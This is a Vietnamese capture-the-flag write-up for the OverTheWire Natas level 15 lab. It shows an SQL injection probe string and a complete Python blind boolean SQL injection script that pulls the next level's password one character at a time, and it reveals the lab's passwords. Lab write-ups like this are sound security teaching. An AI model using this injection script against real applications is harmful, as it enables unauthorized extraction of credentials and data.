## 🕵️‍♂️ Challenge:
Username: natas15  
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx  
URL: http://natas15.natas.labs.overthewire.org  

<img width="1494" height="530" alt="image" src="https://github.com/user-attachments/assets/61e12ac3-445e-4a14-a490-d3c612f6c9af" />

## 📝 Solution: 

<img width="1332" height="972" alt="image" src="https://github.com/user-attachments/assets/760165f4-266d-4514-b3f1-f683accb58e3" />


Như thử thách trước, lần này có thể vẫn là lỗ hỏng SQL injection, kiểm tra lại bằng cách thử nhập chuỗi sau vào ô truy vấn:  

> "OR 1=1 #

<img width="750" height="298" alt="image" src="https://github.com/user-attachments/assets/c5112f68-aeae-42ec-8ec5-000a8976a6e6" />

Sau khi kiểm tra user name vừa nhập, trang báo về:  

<img width="828" height="254" alt="image" src="https://github.com/user-attachments/assets/70f1bd9d-b3ac-4d3b-8c56-49cb9455bbdb" />

Vậy là lỗ hỏng SQL injection, nhưng bài này ko trả về mật khẩu luôn, mà ta phải đi tìm.  

Ta viết script dùng blind boolean SQL injection để dò từng kí tự của password cho đến khi đủ 32 kí tự.  

```python
#!/usr/bin/env python3
import requests
BASE_URL="http://natas15.natas.labs.overthewire.org/index.php?debug"
AUTH=("natas15","SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
T="natas16"
MAX=32
S="This user exists."
s=requests.Session()
def a(p): return S in s.post(BASE_URL,data={"username":p},auth=AUTH).text
def c(i):
    if not a(f'{T}" AND ASCII(SUBSTRING(password,{i},1)) > 31 -- '): return None
    lo,hi=32,127
    while lo<hi:
        m=(lo+hi)//2
        if a(f'{T}" AND ASCII(SUBSTRING(password,{i},1)) > {m} -- '): lo=m+1
        else: hi=m
    if a(f'{T}" AND ASCII(SUBSTRING(password,{i},1)) = {lo} -- '): return chr(lo)
    for alt in (lo-1,lo+1):
        if 32<=alt<=126 and a(f'{T}" AND ASCII(SUBSTRING(password,{i},1)) = {alt} -- '): return chr(alt)
    return chr(lo)
pw=""
for i in range(1,MAX+1):
    ch=c(i)
    if ch is None: break
    pw+=ch
    print(i,ch,pw)
print("Result:",pw)

```
<img width="583" height="700" alt="image" src="https://github.com/user-attachments/assets/5d77f9e1-8ee0-4298-8224-b9b7f2ffe7e3" />

>### 🎯 Password: ***hPkjKYviLQctEW33QmuXL6eDVfMW4sGo***
